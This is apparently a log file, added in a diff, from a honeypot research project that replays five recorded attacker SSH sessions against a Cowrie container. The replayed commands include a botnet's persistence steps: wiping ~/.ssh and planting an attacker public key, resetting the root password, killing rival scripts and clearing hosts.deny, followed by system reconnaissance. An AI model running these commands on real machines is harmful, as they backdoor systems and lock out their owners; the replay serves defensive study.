@@ -1,0 +1,54 @@
+﻿docker :  Container cowrie Running 
+En línea: 1 Carácter: 518
++ ... tion).Path; docker compose run --rm -T -v "$r\attack-runner\replay_da ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: ( Container cowrie Running :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+ Container honeypot-b2-attack-runner-run-28546bed29c5 Creating 
+ Container honeypot-b2-attack-runner-run-28546bed29c5 Created 
+REPLAY {"ev": "inicio", "version": "r1-2026-10-10", "muestra_sha256": "85e368cadfc6e4d59eafbf0da310842eb0a5d0ea115659185a20cb3896f7bc80", "sesiones_muestra": 5, "lote": null, "sesiones_del_lote": [1, 2, 3, 4, 5], "t": "2026-10-10T15:35:24.955922+00:00"}
+REPLAY {"ev": "sesion_inicio", "idx": 1, "session_id": "282f314fac04", "user": "root", "n_comandos": 19, "t": "2026-10-10T15:35:24.956019+00:00"}
+REPLAY {"ev": "login_ok", "idx": 1, "t": "2026-10-10T15:35:25.025030+00:00"}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 1, "comando": "cd ~; chattr -ia .ssh; lockr -ia .ssh", "t": "2026-10-10T15:35:26.081078+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 2, "comando": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~", "t": "2026-10-10T15:35:31.131918+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 3, "comando": "cat /proc/cpuinfo | grep name | wc -l", "t": "2026-10-10T15:35:36.284285+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 4, "comando": "echo \"root:FxMLbTHnZght\"|chpasswd|bash", "t": "2026-10-10T15:35:38.728595+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 5, "comando": "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;", "t": "2026-10-10T15:35:43.779663+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 6, "comando": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'", "t": "2026-10-10T15:35:46.202333+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 7, "comando": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'", "t": "2026-10-10T15:35:50.193659+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 8, "comando": "ls -lh $(which ls)", "t": "2026-10-10T15:35:55.244449+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 9, "comando": "which ls", "t": "2026-10-10T15:35:55.592922+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 10, "comando": "crontab -l", "t": "2026-10-10T15:36:00.644540+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 11, "comando": "w", "t": "2026-10-10T15:36:05.700284+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 12, "comando": "uname -m", "t": "2026-10-10T15:36:10.751650+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 13, "comando": "cat /proc/cpuinfo | grep model | grep name | wc -l", "t": "2026-10-10T15:36:15.802513+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 14, "comando": "top", "t": "2026-10-10T15:36:20.449053+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 15, "comando": "uname", "t": "2026-10-10T15:36:24.606628+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 16, "comando": "uname -a", "t": "2026-10-10T15:36:28.612946+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 17, "comando": "whoami", "t": "2026-10-10T15:36:32.649693+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 18, "comando": "lscpu | grep Model", "t": "2026-10-10T15:36:36.679055+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 1, "i": 19, "comando": "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'", "t": "2026-10-10T15:36:40.970810+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "sesion_fin", "idx": 1, "estado": "ok", "enviados": 19, "de": 19, "t": "2026-10-10T15:36:42.022273+00:00"}
+REPLAY {"ev": "sesion_inicio", "idx": 2, "session_id": "2e692835f44c", "user": "root", "n_comandos": 3, "t": "2026-10-10T15:36:43.022525+00:00"}
+REPLAY {"ev": "login_ok", "idx": 2, "t": "2026-10-10T15:36:43.081227+00:00"}
+REPLAY {"ev": "comando_enviado", "idx": 2, "i": 1, "comando": "cd ~; chattr -ia .ssh; lockr -ia .ssh", "t": "2026-10-10T15:36:44.136014+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 2, "i": 2, "comando": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~", "t": "2026-10-10T15:36:47.523756+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 2, "i": 3, "comando": "cat /proc/cpuinfo | grep name | wc -l", "t": "2026-10-10T15:36:52.674894+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "sesion_fin", "idx": 2, "estado": "ok", "enviados": 3, "de": 3, "t": "2026-10-10T15:36:53.726458+00:00"}
+REPLAY {"ev": "sesion_inicio", "idx": 3, "session_id": "3823b6086b71", "user": "root", "n_comandos": 2, "t": "2026-10-10T15:36:54.726847+00:00"}
+REPLAY {"ev": "login_ok", "idx": 3, "t": "2026-10-10T15:36:54.778538+00:00"}
+REPLAY {"ev": "comando_enviado", "idx": 3, "i": 1, "comando": "cd ~; chattr -ia .ssh; lockr -ia .ssh", "t": "2026-10-10T15:36:55.829480+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 3, "i": 2, "comando": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~", "t": "2026-10-10T15:36:59.322687+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "sesion_fin", "idx": 3, "estado": "ok", "enviados": 2, "de": 2, "t": "2026-10-10T15:37:00.524469+00:00"}
+REPLAY {"ev": "sesion_inicio", "idx": 4, "session_id": "24e29d7f514c", "user": "root", "n_comandos": 2, "t": "2026-10-10T15:37:01.524866+00:00"}
+REPLAY {"ev": "login_ok", "idx": 4, "t": "2026-10-10T15:37:01.578364+00:00"}
+REPLAY {"ev": "comando_enviado", "idx": 4, "i": 1, "comando": "cd ~; chattr -ia .ssh; lockr -ia .ssh", "t": "2026-10-10T15:37:02.631062+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 4, "i": 2, "comando": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~", "t": "2026-10-10T15:37:04.687797+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "sesion_fin", "idx": 4, "estado": "ok", "enviados": 2, "de": 2, "t": "2026-10-10T15:37:05.788913+00:00"}
+REPLAY {"ev": "sesion_inicio", "idx": 5, "session_id": "e9cff58493fc", "user": "root", "n_comandos": 2, "t": "2026-10-10T15:37:06.789194+00:00"}
+REPLAY {"ev": "login_ok", "idx": 5, "t": "2026-10-10T15:37:06.842962+00:00"}
+REPLAY {"ev": "comando_enviado", "idx": 5, "i": 1, "comando": "cd ~; chattr -ia .ssh; lockr -ia .ssh", "t": "2026-10-10T15:37:07.901981+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "comando_enviado", "idx": 5, "i": 2, "comando": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~", "t": "2026-10-10T15:37:09.659744+00:00", "prompt": true, "canal_cerrado": false}
+REPLAY {"ev": "sesion_fin", "idx": 5, "estado": "ok", "enviados": 2, "de": 2, "t": "2026-10-10T15:37:10.811260+00:00"}
+REPLAY {"ev": "fin", "lote": null, "t": "2026-10-10T15:37:11.811621+00:00"}
